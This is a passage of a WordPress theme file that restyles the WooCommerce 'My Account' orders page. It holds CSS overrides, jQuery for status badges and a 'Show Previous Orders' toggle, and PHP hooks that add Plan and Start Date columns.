        transition: all 0.15s;
    }
    
    .show-previous-orders-btn:hover {
        background: var(--tg-bg);
        border-color: var(--tg-text-muted);
    }
    
    .show-previous-orders-btn.expanded {
        background: var(--tg-primary);
        border-color: var(--tg-primary);
        color: var(--tg-white);
    }
    
    .show-previous-orders-btn .btn-icon {
        font-size: 16px;
    }
    
    .show-previous-orders-btn .order-count {
        color: var(--tg-text-muted);
        font-weight: 400;
    }
    
    .show-previous-orders-btn.expanded .order-count {
        color: rgba(255,255,255,0.8);
    }
    
    /* =========================================
       FORCE OVERRIDE WOOCOMMERCE DEFAULTS
       ========================================= */
    
    /* Override all WooCommerce table defaults */
    .woocommerce-account table.woocommerce-orders-table,
    .woocommerce-account .woocommerce-orders-table,
    .woocommerce-account table.woocommerce-orders-table thead,
    .woocommerce-account .woocommerce-orders-table thead,
    .woocommerce-account table.woocommerce-orders-table tbody,
    .woocommerce-account .woocommerce-orders-table tbody {
        border: none !important;
        border-collapse: separate !important;
        border-spacing: 0 !important;
        background: transparent !important;
    }
    
    .woocommerce-account table.woocommerce-orders-table th,
    .woocommerce-account .woocommerce-orders-table th,
    .woocommerce-account table.woocommerce-orders-table td,
    .woocommerce-account .woocommerce-orders-table td {
        border: none !important;
        border-top: none !important;
        border-bottom: none !important;
        padding: 16px 20px !important;
        vertical-align: middle !important;
    }
    
    .woocommerce-account table.woocommerce-orders-table tbody tr,
    .woocommerce-account .woocommerce-orders-table tbody tr {
        border: none !important;
        border-top: none !important;
        border-bottom: 1px solid #F1F5F9 !important;
        background: var(--tg-white) !important;
    }
    
    .woocommerce-account table.woocommerce-orders-table tbody tr:last-child,
    .woocommerce-account .woocommerce-orders-table tbody tr:last-child {
        border-bottom: none !important;
    }
    
    /* Override WooCommerce navigation defaults */
    .woocommerce-account .woocommerce-MyAccount-navigation ul li a::before {
        content: '' !important;
        display: block !important;
    }
    
    .woocommerce-account .woocommerce-MyAccount-navigation ul li a::after {
        display: none !important;
    }
    
    /* Override WooCommerce button defaults */
    .woocommerce-account .woocommerce-button,
    .woocommerce-account .button,
    .woocommerce-account a.button,
    .woocommerce-account button.button {
        border: none !important;
        box-shadow: none !important;
        text-shadow: none !important;
        border-radius: 8px !important;
        padding: 12px 24px !important;
        font-weight: 600 !important;
        text-decoration: none !important;
        transition: all 0.15s ease !important;
    }
    
    /* Override WooCommerce link defaults */
    .woocommerce-account a {
        text-decoration: none !important;
    }
    
    .woocommerce-account a:hover {
        text-decoration: none !important;
    }
    
    /* Override WooCommerce form defaults */
    .woocommerce-account input[type="text"],
    .woocommerce-account input[type="email"],
    .woocommerce-account input[type="password"],
    .woocommerce-account input[type="tel"],
    .woocommerce-account select,
    .woocommerce-account textarea {
        border: 2px solid var(--tg-border) !important;
        border-radius: 10px !important;
        padding: 12px 16px !important;
        box-shadow: none !important;
    }
    
    /* Override WooCommerce message defaults */
    .woocommerce-account .woocommerce-message,
    .woocommerce-account .woocommerce-info,
    .woocommerce-account .woocommerce-error {
        border-left: none !important;
        padding: 16px 20px !important;
        border-radius: 10px !important;
        margin-bottom: 20px !important;
    }
    
    /* Override WooCommerce address defaults */
    .woocommerce-account .woocommerce-Address address {
        font-style: normal !important;
        line-height: 1.7 !important;
    }
    
    /* Ensure our custom styles take precedence */
    .woocommerce-account .woocommerce-MyAccount-navigation,
    .woocommerce-account .woocommerce-MyAccount-content,
    .woocommerce-account .woocommerce-orders-table {
        box-sizing: border-box !important;
    }
    
    /* Force clean white background for content area */
    .woocommerce-account .woocommerce-MyAccount-content {
        background: var(--tg-white) !important;
        background-color: var(--tg-white) !important;
    }
    
    /* Remove any background from parent containers */
    .woocommerce-account .woocommerce,
    .woocommerce-account .entry-content,
    .woocommerce-account .elementor-widget-container {
        background: transparent !important;
        background-color: transparent !important;
    }
    
    .elementor-1863 .elementor-element.elementor-element-db8c479 > .elementor-widget-container {
    background-color: #F06B1A !important;
    padding: 8px 12px 8px 12px;
    border-radius: 5px 5px 5px 5px;
    }

    .elementor-1863 .elementor-element.elementor-element-6ec8fc1 > .elementor-widget-container {
    background-color: #F06B1A !important;
    padding: 8px 12px 8px 12px;
    border-radius: 5px 5px 5px 5px;
    }
    
    .elementor-1863 .elementor-element.elementor-element-6974fa5 > .elementor-widget-container {
    background-color: #F06B1A !important;
    padding: 8px 12px 8px 12px;
    border-radius: 5px 5px 5px 5px;
    }
    </style>
    
    <script>
    jQuery(document).ready(function($) {
        // Add page title for Orders page
        if ($('.woocommerce-orders-table').length) {
            var $content = $('.woocommerce-MyAccount-content');
            if (!$content.find('.myaccount-page-title').length) {
                $content.prepend('<p class="myaccount-page-subtitle">View and manage your order history</p>');
                $content.prepend('<h1 class="myaccount-page-title">Orders</h1>');
            }
        }
        
        // Add status badges dynamically
        $('.woocommerce-orders-table__cell-order-status').each(function() {
            var statusText = $(this).text().trim();
            var status = statusText.toLowerCase();
            var bgColor = '#F1F5F9';
            var textColor = '#64748B';
            var dotColor = '#94A3B8';
            
            if (status.includes('processing')) {
                bgColor = '#FFF7ED';
                textColor = '#EA580C';
                dotColor = '#F97316';
            } else if (status.includes('completed')) {
                bgColor = '#F0FDF4';
                textColor = '#16A34A';
                dotColor = '#22C55E';
            } else if (status.includes('pending')) {
                bgColor = '#FFFBEB';
                textColor = '#D97706';
                dotColor = '#F59E0B';
            } else if (status.includes('cancelled') || status.includes('failed')) {
                bgColor = '#FEF2F2';
                textColor = '#DC2626';
                dotColor = '#EF4444';
            } else if (status.includes('on-hold')) {
                bgColor = '#F5F3FF';
                textColor = '#7C3AED';
                dotColor = '#8B5CF6';
            }
            
            $(this).html('<span class="status-badge" style="background:' + bgColor + '; color:' + textColor + ';"><span class="status-dot" style="background:' + dotColor + ';"></span>' + statusText + '</span>');
        });
        
        // Add icon to View button
        $('.woocommerce-orders-table__cell-order-actions a.view').each(function() {
            if (!$(this).find('svg').length) {
                $(this).prepend('<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="margin-right:4px;"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line></svg>');
            }
        });
        
        // Add data-title for mobile responsive tables
        $('.woocommerce-orders-table thead th').each(function(index) {
            var title = $(this).text();
            $('.woocommerce-orders-table tbody tr').each(function() {
                $(this).find('td').eq(index).attr('data-title', title);
            });
        });
        
        // Show only recent orders (first 5) and add "Show Previous Orders" button
        var $ordersTable = $('.woocommerce-orders-table');
        if ($ordersTable.length) {
            var $rows = $ordersTable.find('tbody tr');
            var visibleCount = 5;
            var totalRows = $rows.length;
            
            if (totalRows > visibleCount) {
                // Hide rows beyond the visible count
                $rows.slice(visibleCount).addClass('hidden-order-row').hide();
                
                // Add "Show Previous Orders" button
                var $showMoreBtn = $('<div class="show-more-orders-wrapper"><button type="button" class="show-previous-orders-btn"><svg class="btn-icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg> Show Previous Orders <span class="order-count">(' + (totalRows - visibleCount) + ' more)</span></button></div>');
                $ordersTable.after($showMoreBtn);
                
                // Handle click
                $('.show-previous-orders-btn').on('click', function() {
                    var $btn = $(this);
                    var $hiddenRows = $('.hidden-order-row');
                    
                    if ($hiddenRows.filter(':hidden').length > 0) {
                        // Show all hidden rows with animation
                        $hiddenRows.slideDown(300);
                        $btn.find('.order-count').hide();
                        $btn.addClass('expanded');
                    } else {
                        // Hide rows again
                        $hiddenRows.slideUp(300);
                        $btn.find('.order-count').show();
                        $btn.removeClass('expanded');
                    }
                });
            }
        }
    });
    </script>
    <?php
}
add_action('wp_head', 'satguru_my_account_styles', 999);

/**
 * Add custom columns to WooCommerce My Account Orders table
 */
function satguru_add_order_columns($columns) {
    $new_columns = array();
    
    foreach ($columns as $key => $name) {
        $new_columns[$key] = $name;
        
        // Add Plan Name and Start Date after Order Number
        if ($key === 'order-number') {
            $new_columns['order-plan'] = __('Plan', 'woocommerce');
            $new_columns['order-start-date'] = __('Start Date', 'woocommerce');
        }
    }
    
    // Remove the default date column (we have start date now)
    // unset($new_columns['order-date']);
    
    return $new_columns;
}
add_filter('woocommerce_account_orders_columns', 'satguru_add_order_columns');

/**
 * Populate custom columns in Orders table
 */
function satguru_populate_order_columns($order) {
    $column_id = current_filter();
    $column_id = str_replace('woocommerce_my_account_my_orders_column_', '', $column_id);
    
    if ($column_id === 'order-plan') {
        $items = $order->get_items();
        if (!empty($items)) {
            $item = reset($items);
            $plan_name = $item->get_name();
            // Shorten if too long
            if (strlen($plan_name) > 30) {
                $plan_name = substr($plan_name, 0, 27) . '...';
            }
            echo '<span class="order-plan-name" title="' . esc_attr($item->get_name()) . '">' . esc_html($plan_name) . '</span>';
        } else {
            echo '<span class="no-plan">-</span>';
        }
    }
    
    if ($column_id === 'order-start-date') {
        $items = $order->get_items();
        $start_date = '';
        
        foreach ($items as $item) {
            foreach ($item->get_meta_data() as $meta) {
                if (strpos($meta->key, 'Start Date') !== false) {
                    $start_date = $meta->value;
                    break 2;
                }
            }
        }
        
        if ($start_date) {
            $formatted_date = date('M j, Y', strtotime($start_date));
            echo '<span class="order-start-date">' . esc_html($formatted_date) . '</span>';
        } else {
            echo '<span class="no-date">-</span>';
        }
    }
}
add_action('woocommerce_my_account_my_orders_column_order-plan', 'satguru_populate_order_columns');
add_action('woocommerce_my_account_my_orders_column_order-start-date', 'satguru_populate_order_columns');

/**
 * Add styles for new order columns and show more button
 */
function satguru_order_columns_styles() {
    if (!is_account_page()) return;
    ?>
    <style>
    /* Plan column */
    .woocommerce-orders-table .order-plan-name {
        font-weight: 500;
        color: var(--tg-text, #334155);
        font-size: 14px;
    }
    
    /* Start Date column */
    .woocommerce-orders-table .order-start-date {
        font-weight: 600;
        color: var(--tg-primary, #F97316);
        font-size: 14px;
    }
    
    .woocommerce-orders-table .no-plan,
    .woocommerce-orders-table .no-date {
        color: var(--tg-text-muted, #94A3B8);
    }
    
    /* Mobile: Plan & Start Date display */
    @media (max-width: 767px) {
        .woocommerce-orders-table__cell-order-plan,
        .woocommerce-orders-table__cell-order-start-date {
            padding-top: 4px !important;
            padding-bottom: 4px !important;
        }
        
        .show-previous-orders-btn {
            width: 100%;
            justify-content: center;
        }
    }
    </style>
    <?php
}
add_action('wp_head', 'satguru_order_columns_styles', 998);